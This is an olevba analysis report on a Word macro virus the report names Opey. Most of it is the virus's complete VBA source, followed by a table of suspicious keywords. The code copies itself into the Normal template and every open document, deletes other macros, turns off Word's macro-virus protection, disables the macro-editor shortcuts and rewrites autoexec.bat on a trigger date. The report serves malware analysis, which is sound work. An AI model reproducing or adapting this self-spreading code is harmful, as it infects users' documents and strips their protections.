olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.bc-cdfc6bda25bd6270b9185d7ed93cc010decdad27
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.bc-cdfc6bda25bd6270b9185d7ed93cc010decdad27 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Stealth.bas 
in file: Virus.MSWord.Opey.bc-cdfc6bda25bd6270b9185d7ed93cc010decdad27 - OLE stream: 'Macros/VBA/Stealth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------------------
' Company: I don't have a company
' Author: Glenn T. Villar
' Date Created: April 14, 2000                        Date Revisions: <>
' Note: This virus displays a happy birthday message every 4th of June.
' ------------------------------------------------------------------------------------

Sub Immunize()
On Error Resume Next
    
    Dim DocuName$, OpenDocImmunized As Boolean
    Dim I%, J%, NmImmunized As Boolean
    
    NmImmunized = False
        
    For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        DocuName = NormalTemplate.VBProject.VBComponents(I).Name
        If DocuName = "Stealth" Then NmImmunized = True
        If (DocuName <> "Stealth") And _
            (DocuName <> "ThisDocument") Then
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName _
                , Name:=DocuName _
                , Object:=wdOrganizerObjectProjectItems
        End If
    Next I
    
    For Each opendoc In Documents
        OpenDocImmunized = False
        With opendoc
            For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                DocuName = opendoc.VBProject.VBComponents(J).Name
                If DocuName = "Stealth" Then OpenDocImmunized = True
                If (DocuName <> "Stealth") And _
                   (DocuName <> "ThisDocument") And _
                   (DocuName <> "Reference to Normal") Then
                     Application.OrganizerDelete Source:=opendoc.FullName _
                     , Name:=DocuName _
                     , Object:=wdOrganizerObjectProjectItems
                End If
            Next J
            
            If Not OpenDocImmunized Then
                Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=opendoc.FullName, _
                Name:="Stealth", _
                Object:=wdOrganizerObjectProjectItems
                opendoc.SaveAs FileName:=opendoc.FullName
            End If
        End With
    Next opendoc
    
    If Not NmImmunized Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
         Destination:=NormalTemplate.FullName, Name:="Stealth", _
         Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
    If Day(Date) = 4 And Month(Date) = 6 Then
If MsgBox("Press ENTER to continue.", vbInformation, "Today is Glenn T. Villar's Birthday!") = vbOK Then
        On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, "echo Happy Birthday Glenn T. Villar!!!"
                        Print #hFile, "echo From: Someone who loves you most."
                        Print #hFile, "echo."
                        Print #hFile, "prompt Glenn T. Villar$_Today's Date -$G$D$_$P$G"
                    Close hFile
End If
End If
End Sub
Sub Initialize()
On Error Resume Next
   
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros -1
   
    With Application
        .UserName = "Glenn T. Villar"
        .UserAddress = "I don't have a company."
        .UserInitials = "GVillar"
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Glenn T. Villar"
        .Keywords = "I don't have a company."
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With
   
   With CommandBars("Tools")
      .reset
      .Controls("Macro").reset
      .Controls("Customize...").reset
   End With
   
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate

End Sub
Sub FileSave()
On Error Resume Next
    Call Initialize
    Call Immunize
    ActiveDocument.Save
End Sub
Sub FileClose()
On Error Resume Next
    Call Initialize
    Call Immunize
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
    Call Initialize
    Call Immunize
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    FoxChitForm.Show
    Application.Quit
End Sub
Sub FileNew()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileNew).Show
    Call Immunize
End Sub
Sub AutoOpen()
On Error Resume Next
   Call Initialize
   Call Immunize
End Sub
Sub AutoExec()
On Error Resume Next
    Call Initialize
    Call Immunize
End Sub
Sub FileSaveAs()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileSaveAs).Show
    Call Immunize
End Sub
Sub FileOpen()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileOpen).Show
    Call Immunize
End Sub

' I just want to make my day a little more exciting.
' By the way, I never intended to make this virus to destroy but to imnmunize.
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

